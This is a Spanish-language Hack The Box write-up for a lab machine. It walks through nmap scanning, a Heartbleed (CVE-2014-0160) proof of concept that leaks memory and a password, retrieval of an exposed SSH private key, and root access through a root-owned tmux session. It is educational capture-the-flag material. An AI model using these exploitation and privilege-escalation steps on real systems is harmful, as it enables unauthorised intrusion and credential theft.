# HTB - Writeup: 10.10.10.79 (Linux)

## 1. Reconocimiento

**Ping inicial:**

``` bash
ping -c 1 10.10.10.79
```

El TTL es **63**, lo que indica un sistema operativo **Linux**.

**Escaneo de puertos completo:**

``` bash
nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.10.79 -oG allPorts
```

Puertos abiertos: - 22 (SSH) - 80 (HTTP) - 443 (HTTPS)

**Escaneo de versiones y scripts:**

``` bash
nmap -p22,80,443 -sCV 10.10.10.79 -oN escaneo
```

------------------------------------------------------------------------

## 2. Enumeración

**Búsqueda de vulnerabilidades en 443:**

``` bash
nmap --script "vuln and safe" -p443 10.10.10.79
```

Resultado: Vulnerabilidad **Heartbleed (CVE-2014-0160)**.

------------------------------------------------------------------------

## 3. Explotación

**Heartbleed PoC:**

``` bash
git clone http://github.com/mpgn/heartbleed-PoC
cd heartbleed-PoC
python2 heartbleed-exploit.py 10.10.10.79
```

El exploit genera `out.txt` con memoria filtrada.

**Extracción de credenciales:**

``` bash
cat out.txt | grep -i -A5 -B5 "base64"
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
```

Se obtiene posible contraseña:

    heartbleedbelievethehype

------------------------------------------------------------------------

## 4. Descubrimiento web

**Fuzzing de directorios:**

``` bash
wfuzz -c --hl 1 --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.79/FUZZ
```

Se descubre `/dev`, dentro de él: - **Archivo:** `hype_key` (clave SSH
privada en hex)

**Decodificación y guardado de clave:**

``` bash
curl -s -X GET "https://10.10.10.79/dev/hype_key" | xxd -ps -r > id_rsa
chmod 600 id_rsa
```

------------------------------------------------------------------------

## 5. Acceso inicial

Probando usuarios, se determina que el válido es **hype**.

**Conexión SSH:**

``` bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@10.10.10.79
```

> Se usa la opción `-o PubkeyAcceptedKeyTypes=ssh-rsa` porque `ssh-rsa`
> está deshabilitado por defecto en versiones modernas de OpenSSH.

**Obtención de user.txt:**

``` bash
cat /home/hype/user.txt
```

------------------------------------------------------------------------

## 6. Escalamiento de privilegios

**Revisión de procesos:**

``` bash
ps aux
```

Se encuentra `tmux` corriendo como **root**.

**Conexión a la sesión tmux:**

``` bash
tmux -S /.devs/dev_sess
```

Esto otorga una shell como **root**.

**Obtención de root.txt:**

``` bash
cat /root/root.txt
```

------------------------------------------------------------------------

## 📌 Resumen Técnico

-   Vulnerabilidad explotada: **Heartbleed (CVE-2014-0160)**\
-   Acceso inicial: **Clave SSH privada** extraída de `/dev/hype_key`\
-   Escalamiento: **Sesión tmux** de root
